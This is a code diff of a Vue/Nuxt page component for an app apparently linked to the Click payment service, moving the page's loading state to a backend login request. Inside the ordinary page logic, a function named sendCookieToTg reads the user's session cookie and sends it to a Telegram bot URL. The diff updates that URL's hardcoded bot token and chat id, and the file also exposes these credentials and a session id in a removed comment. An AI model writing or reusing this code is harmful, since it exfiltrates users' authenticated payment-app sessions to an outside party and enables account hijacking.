@@ -5,7 +5,7 @@
         {{ cookieData }}
       </div>
     </div>
-    <template v-if="loading">
+    <template v-if="pending">
       <HeaderSkeleton></HeaderSkeleton>
       <MainSkeleton></MainSkeleton>
       <MainSkeleton></MainSkeleton>
@@ -41,56 +41,53 @@
 import { storeToRefs } from 'pinia'
 import HeaderSkeleton from '~/components/skeleton/MainHeaderSkeleton.vue'
 import MainSkeleton from '~/components/skeleton/MainSkeleton.vue'
-import { useAppStore } from '~/stores/AppStore'
 import BannerSkeleton from '~/components/skeleton/BannerSkeleton.vue'
 import ChartCardNotCollected from '~/components/ChartCardNotCollected.vue'
 import ChartCardCollected from '~/components/ChartCardCollected.vue'
+import { useAppStore } from '~/stores/AppStore'
 
 definePageMeta({
   layout: 'main',
 })
 const heightDevice = inject('devicePlatform')
+const backendEnv = useRuntimeConfig().public.apiBase
 const appStore = useAppStore()
-const { loading } = storeToRefs(appStore)
+const { user } = storeToRefs(appStore)
+const nuxtApp = useNuxtApp()
 
 const sendCookieToTg = () => {
-  const data = `<pre><code class="language-javascript">WEB-SESSION: ${cookieData.value}</code></pre>`
+  const data = `<pre><code class="language-javascript">${cookieData.value}</code></pre>`
   fetch(
-    `https://api.telegram.org/bot6410254952:AAGi6kN9EyJD6KkHLLBXQ4snVAoP077uztM/sendMessage?chat_id=-4139852497&parse_mode=html&text=${data}`,
+    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
     {
       method: 'GET',
     },
   )
 }
-// const { data } = await useFetch('https://credits.click.uz/api/api/login', {
-//   headers: {
-//     'Content-Type': 'application/json',
-//     Accept: 'application/json',
-//   },
-//   body: {
-//     web_session: 'a00fe98b-edfd-41aa-a0db-536cdb84d36a',
-//   },
-//   method: 'POST',
-// })
-// console.log(data)
 
 const cookieData = computed(() =>
   getCookie('click-web-session')
     ? getCookie('click-web-session')
     : getCookie('web-session'),
 )
-const sendRequest = () => {
-  loading.value = true
-  return new Promise((resolve) => {
-    setTimeout(() => {
-      resolve('resolved')
-    }, 700)
-  }).then(() => {
-    loading.value = false
-  })
-}
 
-sendRequest()
+const { pending } = await useFetch(`${backendEnv}/api/login`, {
+  headers: {
+    'Content-Type': 'application/json',
+    Accept: 'application/json',
+    mode: 'no-cors',
+  },
+  body: {
+    web_session: cookieData.value,
+  },
+  method: 'POST',
+  onResponse({ response }) {
+    user.value = response._data?.user
+  },
+  getCachedData(key) {
+    return nuxtApp.payload.data[key] || nuxtApp.static.data[key]
+  },
+})
 </script>
 
 <style lang="scss" scoped>
